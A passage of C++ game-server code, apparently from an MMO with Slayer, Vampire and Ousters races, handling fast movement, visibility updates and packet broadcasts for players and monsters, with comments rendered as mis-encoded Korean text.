		filelog("CheckMineBug.txt", "%s : %s", "moveFastPC", t.toString().c_str());
	}

	if (pPC->isFlag(Effect::EFFECT_CLASS_GHOST))
	{
//		return false;
	}


	//--------------------------------------------------------------------------------
	// GCAddSlayer/GCAddVampire ¶» žžµéŸîµŽ.
	// öç ¥¿¡ žé, GCAdd ¶º öç ¥ž ¹ž· Ž.
	//--------------------------------------------------------------------------------
	Packet* pGCAddXXX = NULL;

	if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_SLAYER) 
	{
		Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
/*		GCAddSlayer* pGCAddSlayer = new GCAddSlayer(pSlayer->getSlayerInfo3());
		pGCAddSlayer->setEffectInfo(pSlayer->getEffectInfo());*/
		GCAddSlayer* pGCAddSlayer = new GCAddSlayer;
		makeGCAddSlayer( pGCAddSlayer, pSlayer );

		pGCAddXXX = pGCAddSlayer;
	} 
	else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_VAMPIRE) 
	{
		Vampire* pVampire = dynamic_cast<Vampire*>(pPC);

		// .. hide»ó¿¡­ ¿ò÷ öŽ Ÿøöžž..
		// ¹·¡ž Žëºñ.
		if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE))
		{
			GCAddBurrowingCreature* pGCABC = new GCAddBurrowingCreature();
			pGCABC->setObjectID(pVampire->getObjectID());
			pGCABC->setName(pVampire->getName());
			pGCABC->setX(x2);
			pGCABC->setY(y2);
			pGCAddXXX = pGCABC;	
		}
		else
		{
//			GCAddVampire* pGCAddVampire = new GCAddVampire(pVampire->getVampireInfo3());
//			pGCAddVampire->setEffectInfo(pVampire->getEffectInfo());
			GCAddVampire* pGCAddVampire = new GCAddVampire;
			makeGCAddVampire( pGCAddVampire, pVampire );

			pGCAddXXX = pGCAddVampire;
		}
	}
	else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_OUSTERS) 
	{
		Ousters* pOusters = dynamic_cast<Ousters*>(pPC);
//		GCAddOusters* pGCAddOusters = new GCAddOusters(pOusters->getOustersInfo3());
//		pGCAddOusters->setEffectInfo(pOusters->getEffectInfo());
		GCAddOusters* pGCAddOusters = new GCAddOusters;
		makeGCAddOusters( pGCAddOusters, pOusters );

		pGCAddXXX = pGCAddOusters;
	} 

	//--------------------------------------------------------------------------------
	// GCDeleteObject ¶» žžµéŸîµŽ.
	//--------------------------------------------------------------------------------
	GCDeleteObject gcDeleteObject;
	gcDeleteObject.setObjectID(pPC->getObjectID());


	//  Ÿ ¹ü§ž ±žŽ.
	ZoneCoord_t minX, maxX, minY, maxY;
	if (x1 < x2)
	{
		minX = max(0, x1 - maxViewportWidth);
		maxX = min(m_Width-1, x2 + maxViewportWidth);
	}
	else
	{
		minX = max(0, x2 - maxViewportWidth);
		maxX = min(m_Width-1, x1 + maxViewportWidth);
	}
	if (y1 < y2)
	{
		minY = max(0, y1 - maxViewportUpperHeight);
		maxY = min(m_Height-1, y2 + maxViewportLowerHeight);
	}
	else
	{
		minY = max(0, y2 - maxViewportUpperHeight);
		maxY = min(m_Height-1, y1 + maxViewportLowerHeight);
	}

//	Sight_t sight = pPC->getSight();
//	VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pPC->getDir());

	// ObservingEye å®ž °¡®¿Ž.
//	EffectObservingEye* pEffectObservingEye = NULL;
//	if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//	{
//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>( pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//		//Assert( pEffectObservingEye != NULL );
//	}
//
	for (ZoneCoord_t ix = minX ; ix <= maxX ; ix++) 
	{
		for (ZoneCoord_t iy = minY ; iy <= maxY ; iy++) 
		{
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			list<Object*>::const_iterator itr = objectList.begin();

			// visionInfo ¶§¹®¿¡..
			// if - do~while()· ±ž¶ º¯°æ by sigi. 2002.5.8
			if (itr != objectList.end())
			{

				// ü ¥ P(x1,y1)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
//				VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
				VisionState prevVisionState = VisionInfoManager::getVisionState(x1,y1,ix,iy);
				// öç ¥ Q(x2,y2)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
//				VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);
				VisionState curVisionState = VisionInfoManager::getVisionState(x2,y2,ix,iy);

				do
				{
					Assert(*itr != NULL);

					//--------------------------------------------------------------------------------
					//
					// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶» žžµéŸî­
					// owner ¿¡° üŽ. 
					//
					// *NOTES*
					//
					// °¡å âö ®·ü ³ôº °Ž CLASS °¡ case Ÿºº¿¡ ³ª¿Ÿ Ž.
					//
					//--------------------------------------------------------------------------------
					switch ((*itr)->getObjectClass()) 
					{
						//--------------------------------------------------------------------------------
						// ž §¿¡ ©ž®³°¡ » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_CREATURE :
							{
								Creature* pCreature = dynamic_cast<Creature*>(*itr);
								Assert(pCreature != NULL);

								// ±â  ºžŽ ¹» ¿ä°¡ ŸøŽ.
								if (pCreature == pPC) continue;

								switch (pCreature->getCreatureClass()) 
								{
	
									case Creature::CREATURE_CLASS_MONSTER :
										{
											Monster* pMonster = dynamic_cast<Monster*>(pCreature);

											//--------------------------------------------------------------------------------
											//
											// ü ¥¿¡­Ž  žóºž º ö ŸøŸúž³ª, µµø ¥¿¡­  žóºž ºž° µ
											// °æ¿ì GCAddMonster ¶» üŽ.
											//
											//--------------------------------------------------------------------------------
											if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
											{
												Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

												if (pAddMonsterPacket!=NULL)
												{
													pPlayer->sendPacket( pAddMonsterPacket );
													delete pAddMonsterPacket;
												}
											}

											//--------------------------------------------------------------------------------
											// PCž žóº áçû ûž· öŽ.
											//--------------------------------------------------------------------------------
											VisionState vs = pMonster->getVisionState(x2,y2);

											// Aggressive žóº¿¡°žž ûž· µî·Ž.
											if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
											{
												if (isPotentialEnemy(pMonster, pPC))
												{
													pMonster->addPotentialEnemy(pPC);
												}
											}

										}
										break;

									//--------------------------------------------------------------------------------
									//
									//--------------------------------------------------------------------------------
									case Creature::CREATURE_CLASS_SLAYER :
										{
											//--------------------------------------------------------------------------------
											// ü ¥¿¡­Ž ºžö ŸŽ°¡, ¹ø ¥¿¡­ »õ· ºž° µ ©ž®³žž
											// GCAddXXX ž ¹Ÿ¿Ž. °è ºž °æ¿ì¿¡Ž ¹Ÿ¿ö ŸŽŽ.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
											{
												// ºžŽ °¡ º³ª »ó¶óžé µð® µŸî ŸîŸ Ž.
//												if (!pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)
//													|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )
//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pCreature ) ) ) 
												if ( canSee( pPC, pCreature ) )
												{
													Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
//													GCAddSlayer gcAddSlayer(pSlayer->getSlayerInfo3()); 
//													gcAddSlayer.setEffectInfo(pSlayer->getEffectInfo());
													GCAddSlayer gcAddSlayer;
													makeGCAddSlayer( &gcAddSlayer, pSlayer );

													pPlayer->sendPacket(&gcAddSlayer);
												}
												
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											//
											// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
											// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
											// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
											// ºž³»Ÿžž Ž.
											//
											// ¿äŸžé,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// ºžö ŸŽ ¿µ¿ª¿¡­, °æ°è ¿µ¿ª» °¡ö Ÿ°í ¹·
											// Ÿ ³»º ¿µ¿ªž· µéŸî¿ŽŽ °º º°¡ŽŽ.

											// canSee · Žë. by bezz 2003.05.29
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												} 
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;

									case Creature::CREATURE_CLASS_VAMPIRE :
										{
											//--------------------------------------------------------------------------------
											// ü ¥¿¡­Ž ºžö ŸŽ°¡, ¹ø ¥¿¡­ »õ· ºž° µ ©ž®³žž
											// GCAddXXX ž ¹Ÿ¿Ž. ü¿¡µµ NEW_SIGHT °í, ö±µµ NEW_SIGHT žé,
											// »õ· ¹Ÿ¿ö ŸŽŽ.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
											{
												if ( canSee( pPC, pCreature ) )
												{
													if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
													{
												//		if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
	//														|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
														{
															GCAddBurrowingCreature gcABC;
															gcABC.setObjectID(pCreature->getObjectID());
															gcABC.setName(pCreature->getName());
															gcABC.setX(ix);
															gcABC.setY(iy);
															pPlayer->sendPacket(&gcABC);
														}
													} 
													else 
													{
	//													if (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
	//													{
															Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
//															GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
//															gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
															GCAddVampire gcAddVampire;
															makeGCAddVampire( &gcAddVampire, pVampire );
															pPlayer->sendPacket(&gcAddVampire);
	//													}
														// pCreatureŽ invisibility»ó..
	//													else if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) 
	//															|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
	//													{
	//														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
	//														GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
	//														gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
	//														pPlayer->sendPacket(&gcAddVampire);
	//													}
													}
												}
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
											// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
											// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
											// ºž³»Ÿžž Ž.
											//
											// ¿äŸžé,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// »óŽëŽ ¹ìŸî¹· ³ª darkness»óŽ °ü°èŸøŽ.
											// Hideµµ °ü°èŸøŽ.
											// *NOTE
											// »óŽë°¡ ·¹Ÿî¶óžé ·¹Ÿî°¡ º³ª »óöž © Ÿ Ž.
//											if (!pPC->isSlayer() || !pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;

									case Creature::CREATURE_CLASS_OUSTERS :
										{
											//--------------------------------------------------------------------------------
											// ü ¥¿¡­Ž ºžö ŸŽ°¡, ¹ø ¥¿¡­ »õ· ºž° µ ©ž®³žž
											// GCAddXXX ž ¹Ÿ¿Ž. ü¿¡µµ NEW_SIGHT °í, ö±µµ NEW_SIGHT žé,
											// »õ· ¹Ÿ¿ö ŸŽŽ.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT && canSee( pPC, pCreature)) 
											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
//												GCAddOusters gcAddOusters(pOusters->getOustersInfo3());
//												gcAddOusters.setEffectInfo(pOusters->getEffectInfo());
												GCAddOusters gcAddOusters;
												makeGCAddOusters( &gcAddOusters, pOusters );
												pPlayer->sendPacket(&gcAddOusters);
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
											// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
											// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
											// ºž³»Ÿžž Ž.
											//
											// ¿äŸžé,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// »óŽëŽ ¹ìŸî¹· ³ª darkness»óŽ °ü°èŸøŽ.
											// Hideµµ °ü°èŸøŽ.
											// *NOTE
											// »óŽë°¡ ·¹Ÿî¶óžé ·¹Ÿî°¡ º³ª »óöž © Ÿ Ž.
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;
							
									case Creature::CREATURE_CLASS_NPC :
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);

											//--------------------------------------------------------------------------------
											//
											// ü ¥¿¡­Ž  žóºž º ö ŸøŸúž³ª, µµø ¥¿¡­  žóºž ºž° µ
											// °æ¿ì GCAddMonster ¶» üŽ.
											//
											//--------------------------------------------------------------------------------
											if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
											{
												GCAddNPC gcAddNPC;
												makeGCAddNPC(&gcAddNPC, pNPC);
												pPlayer->sendPacket(&gcAddNPC);
											}
										}
										break;

									default :
										throw Error("invalid creature class");
		
								}//switch (pCreature->getCreatureClass())
			
							}//case Object::OBJECT_CLASS_CREATURE :
		
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ Ÿ » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_ITEM :
							{
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
								{
									Item* pItem = dynamic_cast<Item*>(*itr);

									if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) 
									{
										switch (pItem->getItemType()) 
										{
											case SLAYER_CORPSE :
												{
													SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
													GCAddSlayerCorpse gcAddSlayerCorpse;
													makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
													pPlayer->sendPacket(&gcAddSlayerCorpse);
												}
												break;
											case VAMPIRE_CORPSE :
												{
													VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
													GCAddVampireCorpse gcAddVampireCorpse;
													makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
													pPlayer->sendPacket(&gcAddVampireCorpse);
												}
												break;
											case OUSTERS_CORPSE :
												{
													OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
													GCAddOustersCorpse gcAddOustersCorpse;
													makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
													pPlayer->sendPacket(&gcAddOustersCorpse);
												}
												break;
											case NPC_CORPSE :
												{
													throw UnsupportedError(__PRETTY_FUNCTION__);
												}
												break;
											case MONSTER_CORPSE :
												{
													MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
													GCAddMonsterCorpse gcAddMonsterCorpse;
													makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
													pPlayer->sendPacket(&gcAddMonsterCorpse);

													sendRelicEffect( pMonsterCorpse, pPlayer );
												}
												break;
										}//switch
									}
									else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE
											&& pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
									{	
										if (	pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
										{
											GCAddInstalledMineToZone gcAddMine;
											
											makeGCAddInstalledMineToZone(&gcAddMine, pItem, ix, iy);
											pPlayer->sendPacket(&gcAddMine);
										}
									} 
									else 
									{
										GCAddNewItemToZone gcAddNewItemToZone;
										makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
										pPlayer->sendPacket(&gcAddNewItemToZone);
									}
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ å®°¡ » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_EFFECT :
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
								{
									if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
									{
										EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
										ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

										GCAddVampirePortal gcAddVampirePortal;
										gcAddVampirePortal.setObjectID(pEffect->getObjectID());
										gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
										gcAddVampirePortal.setX(ix);
										gcAddVampirePortal.setY(iy);
										gcAddVampirePortal.setTargetZoneID(zonecoord.id);
										gcAddVampirePortal.setTargetX(zonecoord.x);
										gcAddVampirePortal.setTargetY(zonecoord.y);
										gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
										gcAddVampirePortal.setCreateFlag(0);

										pPlayer->sendPacket(&gcAddVampirePortal);
									}
									// by sigi. 2002.6.10
									else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
									{
										EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

										ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
										ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
										
										// sanctuaryŽ ¥ °æ¿ìžž packet» ºž³Ž.
										if (centerX==ix && centerY==iy)
										{
											GCAddEffectToTile gcAddEffectToTile;

											gcAddEffectToTile.setObjectID(pEffect->getObjectID());
											gcAddEffectToTile.setXY(ix, iy); 
											gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
											gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

											pPlayer->sendPacket(&gcAddEffectToTile);
										}
									}
									// Broadcasting Effect © °¡ by Sequoia 2003.3.31
									else if (pEffect->isBroadcastingEffect())
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());
			
										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ åŸ¹° » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_OBSTACLE :
							{
								// darkness
							}
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ ÷» » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_PORTAL :
							{
								// darkness
							}
							break;

						default :
							throw Error("invalid object class");

					}//switch ((*itr)->getObjectClass())
				} while ( ++itr != objectList.end() );	// do ~ while
			}//if
		}//for
	}//for

	SAFE_DELETE(pGCAddXXX);

	return true;
	
	__END_DEBUG 
	__END_CATCH
}


//////////////////////////////////////////////////////////////////////////////
// P(x1,y1)¿¡­ Q(x2,y2)· ºüž¥ µ¿ ©ž®³°¡ º¯ ¿µ¿ª¿¡ žçŽ PCµé¿¡° 
// ºê·µå³º®Ž žîµåŽ.
// for Skill FlashSliding, ShadowWalk
//////////////////////////////////////////////////////////////////////////////
bool Zone::moveFastMonster(Monster* pMonster, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, SkillType_t skillType)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY 
	__BEGIN_DEBUG

	if (
/*		pMonster->isFlag(Effect::EFFECT_CLASS_PARALYZE) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_HIDE) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_CAUSE_CRITICAL_WOUNDS) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_SLEEP) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_ARMAGEDDON) */
		!isAbleToMove( pMonster )
	) {
		// do nothing
		return false;
	} 

	ZoneLevel_t ZoneLevel = getZoneLevel(x2, y2);

	// Ÿü öŽë¿¡ žø µéŸî°£Ž.
	if ((ZoneLevel & SLAYER_SAFE_ZONE)
		|| (ZoneLevel & VAMPIRE_SAFE_ZONE)
		|| (ZoneLevel & COMPLETE_SAFE_ZONE))
	{
		return false;
	}

	// ûŽç Ÿøö¡» £ŽŽ.
	// üžéº¿¡­ ûŽç ö¡..4°³ °»ö
	Dir_t dir = calcDirection(x1, y1, x2, y2);

	// g_FastMoveSearchX, Y· £žžé µŽ. by sigi. 2002.5.8
	int* searchX = g_FastMoveSearchX[dir];
	int* searchY = g_FastMoveSearchY[dir];

	// ºó žö ®.
	int i=0;
	for(i = 0; i< 4; i++)
	{
		int targetX = x2 + searchX[i], targetY = y2 + searchY[i];
		if (targetX >= 0 && targetX < m_Width 
			&& targetY >= 0 && targetY < m_Height 
			&& !m_pTiles[targetX][targetY].isBlocked(pMonster->getMoveMode()) 
			&& !m_pTiles[targetX][targetY].hasPortal())
		{
			x2 = targetX;
			y2 = targetY;
			break;
		}
	}
	if (i == 4) 
	{
		return false;	// ºóž» žø£ŸŽ!
	}
	
	// Ž ¶» žžµéŸîµ°í ¹¿¡­ ºž³Ž.
	GCFastMove gcFastMove;
	gcFastMove.setObjectID(pMonster->getObjectID());
	gcFastMove.setXY(x1, y1, x2, y2);
	gcFastMove.setSkillType( skillType );

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
#endif
	gcFastMove.writeHeaderNBody( outputStream );

	// žóºŽ ºž³Ÿ ¿ä°¡ ŸøŽ.
	//pPlayer->sendPacket(&gcFastMove);
	
	//////////////////////////////////////////////////////////////
	// move Ÿ·ù....
	// ¿¡µû¶ó GCDelete³ª Addµî» ºž³»Ÿ  ö µµ Ž.
	
	// Monster ¥ º¯°æ.
	pMonster->setXYDir(x2, y2, dir);
	// ü ž¿¡­ ©ž®³ž »èŽ.

	try {
		m_pTiles[x1][y1].deleteCreature(pMonster->getObjectID());	
	} catch (Error& e) {
		filelog("assertTile.txt", "moveFastMonster : %s", e.toString().c_str());
		throw;
	}

	// »õ ž¿¡ ©ž®³ž °¡Ž.
	m_pTiles[x2][y2].addCreature(pMonster);

	try {
		checkMine(this, pMonster, x2, y2);
		checkTrap(this, pMonster);
	} catch ( Throwable & t ) {
		filelog("CheckMineBug.txt", "%s : %s", "moveFastMonster", t.toString().c_str());
	}


	//--------------------------------------------------------------------------------
	// GCAddSlayer/GCAddVampire ¶» žžµéŸîµŽ.
	// öç ¥¿¡ žé, GCAdd ¶º öç ¥ž ¹ž· Ž.
	//--------------------------------------------------------------------------------
	Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, NULL );

	if (pAddMonsterPacket!=NULL)
	{
		//--------------------------------------------------------------------------------
		// GCDeleteObject ¶» žžµéŸîµŽ.
		//--------------------------------------------------------------------------------
		GCDeleteObject gcDeleteObject;
		gcDeleteObject.setObjectID(pMonster->getObjectID());


		//  Ÿ ¹ü§ž ±žŽ.
		ZoneCoord_t minX, maxX, minY, maxY;
		if (x1 < x2)
		{
			minX = max(0, x1 - maxViewportWidth);
			maxX = min(m_Width-1, x2 + maxViewportWidth);
		}
		else
		{
			minX = max(0, x2 - maxViewportWidth);
			maxX = min(m_Width-1, x1 + maxViewportWidth);
		}
		if (y1 < y2)
		{
			minY = max(0, y1 - maxViewportUpperHeight);
			maxY = min(m_Height-1, y2 + maxViewportLowerHeight);
		}
		else
		{
			minY = max(0, y2 - maxViewportUpperHeight);
			maxY = min(m_Height-1, y1 + maxViewportLowerHeight);
		}

		//Sight_t sight = pMonster->getSight();

		//VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pMonster->getDir());

		for (ZoneCoord_t ix = minX ; ix <= maxX ; ix++) 
		{
			for (ZoneCoord_t iy = minY ; iy <= maxY ; iy++) 
			{
				const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

				list<Object*>::const_iterator itr = objectList.begin();

				// visionInfo ¶§¹®¿¡..
				// if - do~while()· ±ž¶ º¯°æ by sigi. 2002.5.8
				if (itr != objectList.end())
				{

					// ü ¥ P(x1,y1)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
					//VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
					// öç ¥ Q(x2,y2)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
					//VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);

					do
					{
						Assert(*itr != NULL);

						//--------------------------------------------------------------------------------
						//
						// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶» žžµéŸî­
						// owner ¿¡° üŽ. 
						//
						// *NOTES*
						//
						// °¡å âö ®·ü ³ôº °Ž CLASS °¡ case Ÿºº¿¡ ³ª¿Ÿ Ž.
						//
						//--------------------------------------------------------------------------------
						switch ((*itr)->getObjectClass()) 
						{
							//--------------------------------------------------------------------------------
							// ž §¿¡ ©ž®³°¡ » °æ¿ì
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_CREATURE :
								{
									Creature* pCreature = dynamic_cast<Creature*>(*itr);
									Assert(pCreature != NULL);

									// ±â  ºžŽ ¹» ¿ä°¡ ŸøŽ.
									if (pCreature == pMonster) continue;

									switch (pCreature->getCreatureClass()) 
									{
		
										case Creature::CREATURE_CLASS_MONSTER :
											{
												Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

												//--------------------------------------------------------------------------------
												// PCž žóº áçû ûž· öŽ.
												//--------------------------------------------------------------------------------
												//VisionState vs = pMonster->getVisionState(x2,y2);

												// Aggressive žóº¿¡°žž ûž· µî·Ž.
												//if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
												{
